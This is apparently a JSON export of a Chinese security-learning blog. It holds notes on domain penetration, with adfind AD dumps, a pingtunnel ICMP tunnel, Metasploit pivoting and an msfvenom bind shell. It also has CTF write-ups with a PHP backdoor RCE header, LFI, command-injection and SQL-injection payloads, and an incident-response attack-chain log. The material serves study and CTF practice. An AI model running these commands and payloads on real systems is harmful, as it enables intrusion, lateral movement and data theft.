[{"title":"Java是世界上最好的语言（2024.8.11）","path":"/blog/2024/08/11/java是世界上最好的语言（2024-8-11）/","content":"靠 最近写java有点上瘾 好舒服啊。。。"},{"title":"内网安全","path":"/blog/2024/06/06/内网安全/","content":"开始学内网喽 不定时更新学习笔记 ~~ 域，工作组 工作组 ：大型网络中，可能会有成百上千台计算机组成局域网，所以为了便于管理，将其进行分组，所以有了工作组的概念。将不同的计算机按功能分别列入不同的工作组。 ​ 2. 域： 计算机域**(Domain)**是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可。（安全边界是指：在两个域中，一个域中的用户无法访问另外一个域中的资源。）域可以简单理解为升级版的工作组。但是与工作组相比，域有更严格的安全管理控制机制。用户想要访问域内的资源。必须以合法的身份登录域，而用户对域内的资源拥有什么样的权限，还取决于用户在域内的身份。 域控制器（Domain Controller）是域中的一台类似管理服务器的计算机 域中所有计算机想要互相访问，都要经过域控制器的审核。 DC中存在由这个域的账号，密码，属于这个域的计算机等信息构成的数据库。当计算机连接到域的时候，域控制器首先要鉴别这台计算机是否属于这个域，以及用户使用的登录账号是否存在，密码是否正确。 控制器是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行，也就是说，域内所有用来验证身份的账号和密码列值都保存在域控制器中。 域的分类 1、单域 两台服务器就可以形成，一个作为DC，另一台作为备份DC。而活动目录的数据库是存在DC中的，如果没有备份DC，一旦DC瘫痪了，域内其他用户就无法登录该域了，所有有一台备份DC，在瘫痪后进行备份恢复就能正常使用了。 2、父域和子域 有了域后，数量过多的情况下就需要进行管理，进行分级划分为多个域进行管理的情况下，第一个域称为父域，各部分的域称为该域的子域。举个例子理解下，一大型公司存在各个分公司，分公司位于不同的地点，这种情况就需要父域和子域，如果把所有分公司都放在一个域内，在信息交互的时候会出现带宽高延迟高浪费非常多的时间，交互的信息量变大不会压缩的情况下会导致崩溃的现象，那么在多个域之间进行信息交互量就相对较小，切信息量可以压缩。而在管理和安全层面，多个域有利于自己的域管理自己的资源，多个域可以布置多个安全策略进行提升安全系数。 3、域树 在子域和父域就了解到，一个域管理员只能管理本域，不能访问和管理其他域，如果需要互相访问则需要建立信任关系，信任关系就是连接不同域的桥梁，不同域之间建立了信任关系后，就能在不同域之间实现网络资源共享与管理，通信及数据传输等。继续了解下域树的阶层概念，域树的阶层是按照“.”点号隔开区分的，一个点号代表一个层次，例如:域yizhi.xiaobai.com 的级别比域xiaobai.com级别低。还有子域只能使用父域的名字作为其域名的后缀，所以在域树中域的名字是连续的。 4、域森林 多个域树通过建立信任关系后的集合就是域森林。例如在一个公司进行兼并的时候，公司目前使用的域树是abc.com，被兼并的公司存在自己的域树为dayu.net，在这种情况下进行兼并，就需要域树abc.com和域树dayu.net之间建立信任关系来构成域森林，通过信任管理建立，可以管理和使用整个域森林中的资源，在由域的特点特性保留着兼并公司自身原有的特性。 5、域名服务器 域名服务器就是DNS，在现实用配置IP也是经常会配置的。是指用于实现域名和与之相应的IP地址转换的服务器。回头观望下域树的知识可知，域树中的域名和DNS域名非常的相似（xiaobai.com等)，实际上，域中的计算机是使用DNS来定位域控制器、服务器、网络服务等，所以域的名字就是DNS域的名字。所以在内网渗透中，大多数情况都是通过寻找DNS服务器来确定域控制器的位置，因为域控制器和DNS服务器都配置在同一台机器上! AD活动目录 活动目录(AD）是指域环境中提供目录服务的组建。首先来了解下目录，目录用于存储有关的网络对象（例如，用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是指帮助用户快速准确的从目录中找到其所需要的信息服务。所以活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制。 活动目录就是索引。目录数据存储在域控制器上的Ntds.dit文件中。我们建议将该文件存储在一个NTFS分区上。有些数据保存在目录数据库文件中，而有些数据则保存在一个被复制的文件系统上 1．账号集中管理:所有的账号均存储在服务器中，方便执行命令和密码重置等操作。 2．软件集中管理:统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择需要安装的软件。 3．环境集中管理:统一客户端桌面、ID、TCP&#x2F;IP协议等设置。 4．增强安全性:统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机访问权限、统—制定用户密码策略等。可以监控网络、对资料进行统一管理。 5．更可靠，更短的宕(dang)机时间·例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置。 6.活动目录是微软提供的统一管理基础平台，工SA、Exchange、SMS等都依赖这个平台 把网络中的众多对象（计算机、用户、用户组、打印机、共享文件等）分门别类、并然有序的放在一个大的仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源)。这个拥有层次结构的数据库，就是活动目录数据库，简称AD库。 如果内网中的一台计算机上安装了活动目录(AD)，它就成了域控制器（DC)用于存储活动目录数据库的计算机。 域相关内置组的权限︰AGDLP从类型区分域组： 安全组：具有安全标识（SID），主要用于授权访问资源，也可以用于群发电子邮件通讯组：没有安全标识（SID），不能授权访问资源，只能用于群发电子邮件从作用范围区分域组： 域本地组：组中成员可以来自域林中所有的域，用于授权访问本域资源全局组：组中成员来自本域，用于授权访问域林中所有域的资源通用组：组中成员来自域林中所有的域，用于授权访问域林中所有域的资源 域渗透思路： 定位DC的ip 与 域管的账号 利用域成员主机作为跳板 增大渗透范围 设法在域成员主机内存中找出DC密码 拿下控制权 域的策略组策略对象同步 组策略管理 创建GPO链接 防火墙进行何止 更新策略三种方法 强制 命令 gpupdate/force 重启 组策略不出网上线 策略规则导致无法正常通讯 解决思路 正向连接 隧道技术 出站封杀： 1.无网络 - 取得一台有网络机器且可与其通讯的机器的机器权限 通过出网的机器正向主动控制他。 2.有网络 - 上述正向思路 - 隧道技术 走其他协议出网 windows 域信息收集 手工命令查询基本信息 工具使用信息收集 cs插件 bloodhound 内网渗透流程分析 adfind 导出当前域内所有信息： adfind.exe -h 127.0.0.1&gt;all.txt 导出当前域内所有用户信息： adfind.exe -h 127.0.0.1 -f objectcategory=person&gt;user.txt 导出当前域内所有机器信息： adfind.exe -h 127.0.0.1 -f objectcategory=computer&gt;machine.txt 导出当前域内所有组信息： adfind.exe -h 127.0.0.1 -f objectcategory=group&gt;group.txt 导出当前域内所有管理员组的用户信息： adfind.exe -h 127.0.0.1 -f &quot;(&amp;(objectCategory=group)(name=Domain Admins))&quot;&gt;admin.txt 导出当前域内所有OU信息： adfind.exe -h 127.0.0.1 -f objectcategory=organizationalUnit&gt;ou.txt 导出当前域内所有的域用户名： adfind.exe -h 127.0.0.1 -f objectcategory=person SamAccountName&gt;username.txt 导出当前域内所有的计算机名： adfind.exe -h 127.0.0.1 -f objectcategory=computer name&gt;machinename.txt 2.从域外远程导出活动目录信息示例 导出远程域内所有信息： adfind.exe -h 192.168.1.1 -u test\\admin -up Password&gt;all.txt 隧道代理出网 通过icmp 协议 工具 pingtunnel pingtunnel.exe -type client -l 127.0.0.1:4444 -s [攻击机ip] -t [攻击机ip：端口] -tcp 1 -noprint 1 -nolog 1 内网环境代理通讯 msf 下代理转发 添加路由 限于 MSF 查看路由信息 run autoroute -p run post&#x2F;multi&#x2F;manage&#x2F;autoroute 添加指定路由，1 是接收的 session 编号 route add 192.168.11.0 255.255.255.0 2、Sock 代理 全局同用 ​ use auxiliary&#x2F;server&#x2F;socks_proxy ​ set srvhost 0.0.0.0 ​ set srvport 1115 ​ run 启用代理软件配置 Sock5 代理 cs 手动操作代理设置即可 正向webshell连接 cs 建立正向 bind_tcp 监听器 然后 connect ip port msf msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe &gt; bd.exe use exploit/multi/handler set payload windows/meterpreter/bind_tcp set rhost 192.168.11.129 set lport 3333 run"},{"title":"SQL blind(盲注) 综合脚本 by aydes","path":"/blog/2024/04/15/sql-blind盲注-综合脚本-by-aydes/","content":"github : https://github.com/Tayie/ctf-tool"},{"title":"青少年CTF 2024 round1 wp","path":"/blog/2024/03/02/青少年ctf-2024-round1-wp/","content":"Web Easymd5 打开发现两个上传界面 显示需要上传pdf文件类型 一开始以为是文件上传漏洞利用发现抓不到上传的包 加上后面的到的提示 去尝试md5碰撞 可以假设上传两个相同md5的文件 利用md5相同文件生成工具hashclash 生成两个pdf文件后上传成功 并且获得flag Php的后门 打开是phpinfo 的界面 根据题目提示 php后门漏洞 由wappalzer显示php版本8.1.0 于是想到了PHP 8.1.0-dev 后门远程命令执行漏洞 在数据包中 添加 User-Agentt: zerodiumsystem(‘cat &#x2F;flag’) 即可获取flag-Php xxe由题目提示可得xxe注入漏洞 直接在数据包中添加实体类型"},{"title":"2023年 全国大学生信息安全竞赛安徽省赛 部分WP","path":"/blog/2024/01/05/2023年-全国大学生信息安全竞赛安徽省赛-部分wp/","content":"-—————--—By o1OIst Misc—Steganography（1）题目分析 下载比赛文件打开压缩包发现有两者看起来一样的图片和一个加密的flag压缩包里面有flag.txt 两张图片careful.jpg 和 careful1.jpg 加上加密的flag.txt 因为本题考查隐写知识点 所以猜测是通过两张图片获取到解开压缩包的密码 即可获得flag 按照解题习惯会右键查看图片的一些详细信息 需要格外注意备注一栏。发现careful1.jpg的详细信息备注栏有一段字符串xqwed 暂时放这。 再将careful.jpg 和 careful1.jpg 都拖入010editor 进一步观察到careful.jpg 最下方有一段类似base64加密的字符串MTJlcmNzLi4uLi45MDlqaw&#x3D;&#x3D; 提取出来 利用解密工具解密 的到 12ercs…..909jk 这段字符串看起来可能是压缩包密码的一部分 目前careful.jpg先分析到此 careful1.jpg 在010editor中并没有明显的信息可以提取 于是利用之前备注中找的字符串与base64解码出的字符串看是否关联 **4.**因为受到题目的隐写影响 一开始并没有尝试将两个字符串联系 两张一样的图片 怀疑过盲水印 用Bindwatermark 工具将两张图片解密无果 又尝试用 stegdetect stegsolve等工具探测隐写方式 也都无果 （2）解题过程 **5.**后来因为注意到base64解码出的字符串中有5个省略号 而备注栏提取的正好5个字符 所以尝试xqwed取代省略号 得到12ercsxqwed909jk **6.**猜测是flag加密压缩包的密码 尝试带入解压 发现成功得到flag flag{4d72e4f3-4d4f-4969-bc8c-a2f6f7a4292c} 至此本题结束。 Web-—–游戏 题目分析 题目上来给了ip 访问发现是一个弹球游戏 根据提示是通关才能获取flag 当然肯定不会人工通关 这种题目直接分析源码 F12****打开只有四个js文件的链接 Game.js Common.js Scene.js Main.js 猜测可能是分析js源码 从而将游戏快速通关获得flag 在分析当中感觉源码太多 投机取巧的关闭浏览器的javascript 但是关闭后直接不显示任何东西 无果 后来还是老老实实的分析源码 发现main.js 与 scene.js 用来调用函数与场景 对解题无实际帮助 （2）解题过程 Game.js 在分析过程中发现这么一段代码 所以当游戏结束时候调用函数 _f() 可知游戏通关时输出数组内容 数组中变量分别如图所示 代入直接将ascii 转字符 就可以得到flag flag{java3cr1qtG3} 这题是比较暴力的分析源码直接获取flag，感觉这题wp不是很web，就当是web源码泄露的题来做了. 至此所答题的wp结束."},{"title":"二叉树的遍历之栈","path":"/blog/2023/06/11/二叉树的遍历之栈/","content":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950代码如下（思路从网上找的）void midTraverseStack(TreeLink root)&#123; stack&lt;treenode *&gt;S; S.push(root); while(!S.empty())&#123; //该过程一直找到没有左节点的节点才停止 while(S.top()-&gt;lchild!=NULL)&#123; S.push(S.top()-&gt;lchild); &#125; v //while循环会一直将栈顶输出，直到遇到有右节点的节点，这样能保证栈中元素不会重复寻找左孩子 while(!S.empty())&#123; treenode *cur = S.top(); cout&lt;&lt;cur-&gt;data&lt;&lt;&quot; &quot;; S.pop(); if(cur-&gt;rchild!=NULL)&#123; S.push(cur-&gt;rchild); x break; //若检测到右孩子 将其入栈 &#125; &#125; &#125; cout&lt;&lt;endl; &#125;// 中序遍历函数-----非递归-栈开始以为下面这段代码是一次性的遍历所有左子树 while(S.top()-&gt;lchild!=NULL)&#123; S.push(S.top()-&gt;lchild); &#125; 直到我发现事情不对啊---=。=因为如果这个思路下去 那么就会导致右子树的左子树无法遍历到后来发现下面这段的代码中的break....... if(cur-&gt;rchild!=NULL)&#123; S.push(cur-&gt;rchild); x break; //若检测到右孩子 将其入栈 &#125;​这个如果检测到右子树，会停止遍历入栈出栈====》转到上面对左子树的遍历======》将其压入栈顶所以左子树的那个入栈是动态的结束"},{"title":"web安全","path":"/blog/2023/05/31/小迪网安笔记/","content":"这些基础以后更新把 基础漏洞 SQL注入 文件上传 xss csrf&#x2F;ssrf 文件包含（php） RCE代码及命令执行 php&#x2F;java反序列 信息打点"},{"title":"CTF","path":"/blog/2023/05/31/winhex-伪加密/","content":"WEB ping ;A;B先执行A，再执行B&amp;A&amp;B简单拼接，A B之间无制约关系AB显示B的执行结果&amp;&amp;A&amp;&amp;BA执行成功，然后才会执行BABA执行失败，然后才会执行B若上述被过滤 可用换行%0a url编码替代 （在网址输入框）代替空格$IFS ${IFS} $IFS$1 &#x2F;&#x2F;1 改 成 1改成1改成加其他数字貌似都行 &lt; &lt;&gt; {cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能 %20 %09&#x2F; （斜杠也可以） $(printf &quot;路径&quot;)代替路径 里面用十六进制\\x66形式 php 文件包含漏洞文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制， 包含其他恶意文件，导致了执行非预期代码 分类：远程文件包含RFI 本地文件包含LFI 区分他们最简单的方法就是 php.ini 中是否开启了allow_url_include。 如果开启了我们就有可能包含远程文件 _php 中引发文件包含漏洞的通常是以下四个函数_： 1、include() 当使用该函数包含文件时，只有代码执行到 include() 函数时才将文件包含进来， 发生错误时只给出一个警告，继续向下执行。 2、include_once() 功能和 include() 相同，区别在于当重复调用同一文件时，程序只调用一次。 3、require() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行 4、require_once() 它的功能与 require() 相同，区别在于当重复调用同一文件时，程序只调用一次。 php伪协议利用 data协议data:&#x2F;&#x2F;协议必须在满足allow_url_fopen&#x3D;on，allow_url_include&#x3D;on下使用 data:&#x2F;&#x2F; 伪协议利用php中流的概念，将原本include的文件流重定向到可控制的参数中 data:&#x2F;&#x2F;text&#x2F;plain, &#x2F;&#x2F;如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; 2.php协议 利用条件：1、allow_url_include &#x3D; On。 php:&#x2F;&#x2F;filter用于读取源码。eg: ?file1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&amp;file2&#x3D;php:&#x2F;&#x2F;input​php:&#x2F;&#x2F;input用于执行php代码dict:&#x2F;&#x2F;file:&#x2F;&#x2F;&#x2F; php序列化和反序列化 1.序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。 反序列化则相反将字符串重新恢复成对象 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，**__sleep()方法会先被调用，然后才执行序列化操作。可以在__sleep()方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性** flag = 'flag{adada}'; $ctfer->name = 'ev'; $ctfer->age = '12'; echo serialize($ctfer); echo ''; ​ var\\_dump(unserialize($a)); ?> 反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去unserialize的时候，会 检查时候存在wakeup()函数，如果存在的话，会优先调用wakeup()函数。 ascill 的超出打印区域将两位一组的十六进制 &#x3D;&#x3D;》十进制&#x3D;&#x3D;》 减去128 &#x3D;&#x3D;》转为asciisql注入类 sqllite注入 sqlite注释符是‘– 查询其全局模式表sqlite_master（存放本数据库所有表、视图、索引、触发器等的定义）可找到用户表的sql定义’ payload：user&#x3D;’ union select name,sql from sqlite_master – sql注入绕过姿势： &#x2F;**&#x2F;或者++替换空格 大小写 递归重复 待补充。。。 sql注入回显 （攻防世界–fakebook iframe的src暴露信息）可以结合序列化的返回渲染页面 当目录存在某个flag.txt 但是不能读取或显示 用 伪协议 file:&#x2F;&#x2F;&#x2F;path 获取ping中检测绕过 构造变量 若flag进行过滤 设置变量接受字母 若过滤bash 使用sh 并将命令编码echo$IFS$1Y2F0IGZsYWcucGhwbase64$IFS$1-dsh 内联执行 使用 `` 代替 ，将反引号内命令的输出作为输入执行，即：&#x2F;?ip&#x3D;2.2.2.2;cat$IFS$1`ls` 代码审计（一）php1.比较 “&#x3D;&#x3D;” 与“&#x3D;&#x3D;&#x3D;”注意：”&#x3D;&#x3D;“ 比较字符串和整形 会强制转换成字符串如 “1admin” 与 1 比较 &#x3D;&#x3D;&#x3D;&gt; true 取字符串开头数字转换为字符 若以“0e”开头的字符串 会当作0x10的xxx次方 结果为零 hash 比较缺陷md5(‘240610708’) &#x3D;&#x3D; md5(‘QNKCDZ0’) 结果都是0e开头 所以都是零 结果相等var_dump(md5(‘240610708’)&#x3D;&#x3D;md5(‘QNKCDZO’));var_dump(md5(‘aabg7XSs’)&#x3D;md5(‘aabC9RqS’));var_dump(sha1(‘aarozmok’)&#x3D;&#x3D;shal(‘aaK1STfY’));var_dump(sha1(‘aa08ZKZF’)&#x3D;&#x3D;sha1(‘aa30FF9m’));var_dump(‘e010e2”&#x3D;’1e3’):var_dump(‘0×1234Ab’&#x3D;&#x3D;’1193131’)：var_dump(‘0xABCdef’&#x3D;&#x3D;’0xABCdef’);​ bool欺骗存在json_decode 和 unserialize 时候 部分结构解释为bool类型 造成欺骗 数字转换欺骗 一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较所以0x1e240 &#x3D;&#x3D; 123456 md5()只能传输字符串 若传入array会使所有array的md5相同hash碰撞 会碰撞出两个相同的值switch()会对传入字符串类型强转 is_numeric() （bool） 传入是是数字和数字字符串则返回 TRUE 如果此时传入十六进制0x3120616e6420313d31 存入后字符串 为 1 and 1&#x3D;1可进行二次注入 in_array() &#x2F; array_search() eg: ‘abc’ 在 array(0,1,2) 中 返回true empty （以下都认为 为空） “” (空字符串) 0 (作为整数的0) 0.0 (作为浮点数的0) “0” （作为字符串的0） NULL FALSE array() （空数组） $var; (一个声明了 但无值的变量) $$ 的用法“$$的用法” extract() parse_str()把查询字符串解析到变量中 php常用函数： ord() :ord() 函数返回字符串中第一个字符的 ASCII 值。 strrev() 反转字符串 substr() 返回字符串的子串 格式：substr ( string, start , length ) isset() 用于检测变量是否已设置，且非 NULL preg_match() 用于执行一个正则表达式匹配 str_rot13() 函数对字符串执行 ROT13 编码。ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。 call_user_func() 传入有参或无参函数 后面跟上参数 python反编译 uncompyle6 当前文件名.pyc &gt; 保存的文件名.py"},{"title":"About me","path":"/blog/about-me/index-2.html","content":"一个网络安全的小菜鸟，CTFer web+misc 手","categories":[null]},{"title":"Contact me","path":"/blog/contact-me/index-5.html","content":"QQ: 1686046681 email: &#x74;&#x61;&#121;&#51;&#x33;&#52;&#x35;&#54;&#x31;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#109;","categories":[null]},{"title":"隐私政策","path":"/blog/privacy-policy/index-2.html","content":"我们是谁推荐的文本： 我们的站点地址是：http://www.ayfield.cf。 评论推荐的文本： 当访客留下评论时，我们会收集评论表单所显示的数据，和访客的IP地址及浏览器的user agent字符串来帮助检查垃圾评论。 由您的电子邮箱地址所生成的匿名化字符串（又称为哈希）可能会被提供给Gravatar服务确认您是否有使用该服务。Gravatar服务的隐私政策在此：https://automattic.com/privacy/。在您的评论获批准后，您的资料图片将在您的评论旁公开展示。 媒体推荐的文本： 如果您向此网站上传图片，您应当避免上传那些有嵌入地理位置信息（EXIF GPS）的图片。此网站的访客将可以下载并提取此网站的图片中的位置信息。 Cookies推荐的文本： 如果您在我们的站点上留下评论，您可以选择用cookies保存您的名字、电子邮箱地址和网站地址。这是通过让您可以不用在评论时再次填写相关内容而向您提供方便。这些cookies会保留一年。 如果您访问我们的登录页，我们会设置一个临时的cookie来确认您的浏览器是否接受cookies。此cookie不包含个人数据，且会在您关闭浏览器时被丢弃。 当您登录时，我们也会设置多个cookies来保存您的登录信息及屏幕显示选项。登录cookies会保留两天，而屏幕显示选项cookies会保留一年。如果您选择了“记住我”，您的登录状态则会保留两周。如果您注销登陆了您的账户，用于登录的cookies将会被移除。 如果您编辑或发布文章，我们会在您的浏览器中保存一个额外的cookie。这个cookie不包含个人数据而只记录了您刚才编辑的文章的ID。这个cookie会保留一天。 来自其他网站的嵌入内容推荐的文本： 此站点上的文章可能会包含嵌入的内容（如视频、图片、文章等）。来自其他站点的嵌入内容的行为和您直接访问这些其他站点没有区别。 这些站点可能会收集关于您的数据、使用cookies、嵌入额外的第三方跟踪程序及监视您与这些嵌入内容的交互，包括在您有这些站点的账户并登录了这些站点时，跟踪您与嵌入内容的交互。 我们与谁共享您的信息推荐的文本： 若您请求重置密码，您的IP地址将包含于密码重置邮件中。 我们保留多久您的信息推荐的文本： 如果您留下评论，评论和其元数据将被无限期保存。我们这样做以便能识别并自动批准任何后续评论，而不用将这些后续评论加入待审队列。 对于本网站的注册用户，我们也会保存用户在个人资料中提供的个人信息。所有用户可以在任何时候查看、编辑或删除他们的个人信息（除了不能变更用户名外）、站点管理员也可以查看及编辑那些信息。 您对您的信息有什么权利推荐的文本： 如果您有此站点的账户，或曾经留下评论，您可以请求我们提供我们所拥有的您的个人数据的导出文件，这也包括了所有您提供给我们的数据。您也可以要求我们抹除所有关于您的个人数据。这不包括我们因管理、法规或安全需要而必须保留的数据。 您的数据将发送到何处推荐的文本： 访客评论可能会被自动垃圾评论监测服务检查。","categories":[null]},{"title":"主页","path":"/blog/home/index-2.html","content":"WELCOME TO MY BLOG站点日志： 2023-11-26 上了https啦 折腾一晚上 终于把ssl给站点上了&#x3D;。&#x3D;ssl+容器+cf代理转发(白嫖cdn)+不在内地服务器 &#x3D;&#x3D;现在网站访问速度 :D 2024-01-24 站点故障修复 突然间服务器容器出了问题 最后排查https出现问题 然后随便就恢复好了 蛮奇怪 2024-04-15 cf的垃圾ssl 每次重启容器 就更新密钥 垃圾不要了","categories":[null]},{"title":"攻击链梳理","path":"/blog/攻击链梳理/index-1.html","content":"2024.7.1610:44:41(告警) 发现冰蝎webshell流量告警 攻击ip: 10.110.230.239 受害ip: 10.95.209.77 (tomcat)根据冰蝎特征基本判断是冰蝎webshell上传 2024.7.16 10:08:21 第一次连接webshell 受害ip: 10.95.209.77 2024.7.16 10:08:21—-2024.7.16 10:45:13 之间进行间断的执行命令操作 2024.7.1610:07:42 Tomcat 远程代码执行(CVE-2017-12615)(成功) 受害ip: 10.95.209.77 由漏洞数据包内容特征 并结合后门冰蝎的告警 基本判断是该漏洞导致webshell的上传最早在2024-07-15 10:11:25 攻击者尝试利用漏洞上传webshell2024-07-15 10:13:37攻击者尝试客户端连接 解密数据包 受害ip: 10.95.209.77 由上述漏洞捕捉到的明文数据包 得到密钥md5值根据解密结果得到受害机具有 ens33 和 ens34 双网卡en34ip ：192.168.8.130 （可能存在192.168.8.0&#x2F;24 c段横向）2024-07-15 10:13:37——- 获取系统信息2024-07-15 10:13:43 —— cd &#x2F;opt&#x2F; ;ifconfig2024-07-15 10:13:40 —— whoami2024-07-15 10:25:24——- 获取系统信息2024-07-15 10:25:32——-cd &#x2F;opt&#x2F; ;useradd test 添加test用户2024-07-15 10:28:21——-cd &#x2F;opt&#x2F; ;passwd test 失败 2024-07-16 10:07:42 —– 再次利用漏洞上传webshell2024-07-16 10:08:21——- 尝试连接webshell 成功（未解）2024-07-16 10:18:15—–获取系统信息 分析攻击ip：10.110.230.239&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-07-11 14:06:13 发现受害机器 10.95.209.15 （8080web应用尝试漏洞利用） 2024-07-11 14:06:13-—–14:33:36尝试利用接口POST &#x2F;ureport&#x2F;designer&#x2F;saveReportFile发现其c2 ip： 101.201.209.38:81 尝试远程命令执行目录穿越 失败 2024-07-11 14:34:51–2024-07-11 14:36:38攻击者尝试10.95.209.15:81利用nginx 配置不当&#x2F;tp5&#x2F;thinkphp&#x2F;&#x2F;tp5&#x2F;敏感目录泄露 2024-07-11 14:43:42—2024-07-11 14:44:01攻击者尝试10.95.209.15:82利用nginx 配置不当&#x2F;tp5&#x2F;thinkphp&#x2F;&#x2F;tp5&#x2F;敏感目录泄露 2024-07-16 10:47:56 发现受害机器 10.95.209.1532024-07-16 10:47:56-———–8080web应用尝试弱口令利用 失败 2024-07-16 14:50:05 ———-10.95.209.153:82尝试命令执行post &#x2F;发送 url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 获取敏感文件攻击成功 分析受害ip：10.95.209.77&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-07-16 10:23:18 怀疑攻击者利用受害者ip的en34网卡 192.168.8.130 c段横向攻击 2024-07-16 10:23:18尝试攻击目标主机 ： 192.168.8.254尝试利用接口POST &#x2F;webtools&#x2F;control&#x2F;xmlrpc 实行xxe攻击 失败2024-07-16 10:23:18尝试攻击目标主机： 192.168.8.132:8888尝试利用接口POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node sql注入攻击 失败 发现直到2024-07-16 10:23:38 的20s内 出现多个漏洞的告警事件初步判定攻击者使用漏扫工具扫描c段ip 分析受害ip：10.95.209.15&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 2024-06-24 03:10:12 攻击ip :10.95.58.130 nmap扫描 2024-06-27 06:48:56&amp;2024-06-30 07:52:10 攻击ip: 10.95.58.137 nmap扫描 2024-07-01 07:54:11 攻击ip: 10.95.58.104 nmap扫描 2024-07-02 22:33:57&amp;2024-07-10 22:27:38 攻击ip: 10.95.58.111 2024-07-05 23:23:44nmap 扫描 2024-07-04 22:56:32 攻击ip: 10.95.58.103 nmap 扫描 2024-07-06 22:04:45&amp;2024-07-12 01:34:06 攻击ip: 10.95.58.132 nmap 扫描 2024-07-09 17:43:50—2024-07-09 17:44:08 **攻击ip:**10.95.209.6 漏扫 2024-07-12 01:34:06 攻击ip: 10.95.58.31 nmap 扫描 =&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 总结 10.110.230.239 利用目标10.95.209.77 tomcat 上传漏洞上传冰蝎webshell执行命令并横向 192.168.8.132:8888 和 192.168.8.254 两个目标 尝试漏扫攻击 未果","categories":[null]},{"title":"攻击链梳理","path":"/blog/攻击链梳理/index-2.html","content":"2024.7.1610:44:41(告警) 发现冰蝎webshell流量告警 攻击ip: 10.110.230.239 受害ip: 10.95.209.77 (tomcat)根据冰蝎特征基本判断是冰蝎webshell上传 2024.7.16 10:08:21 第一次连接webshell 受害ip: 10.95.209.77 2024.7.16 10:08:21—-2024.7.16 10:45:13 之间进行间断的执行命令操作 2024.7.1610:07:42 Tomcat 远程代码执行(CVE-2017-12615)(成功) 受害ip: 10.95.209.77 由漏洞数据包内容特征 并结合后门冰蝎的告警 基本判断是该漏洞导致webshell的上传最早在2024-07-15 10:11:25 攻击者尝试利用漏洞上传webshell2024-07-15 10:13:37攻击者尝试客户端连接 解密数据包 受害ip: 10.95.209.77 由上述漏洞捕捉到的明文数据包 得到密钥md5值根据解密结果得到受害机具有 ens33 和 ens34 双网卡en34ip ：192.168.8.130 （可能存在192.168.8.0&#x2F;24 c段横向）2024-07-15 10:13:37——- 获取系统信息2024-07-15 10:13:43 —— cd &#x2F;opt&#x2F; ;ifconfig2024-07-15 10:13:40 —— whoami2024-07-15 10:25:24——- 获取系统信息2024-07-15 10:25:32——-cd &#x2F;opt&#x2F; ;useradd test 添加test用户2024-07-15 10:28:21——-cd &#x2F;opt&#x2F; ;passwd test 失败 2024-07-16 10:07:42 —– 再次利用漏洞上传webshell2024-07-16 10:08:21——- 尝试连接webshell 成功（未解）2024-07-16 10:18:15—–获取系统信息 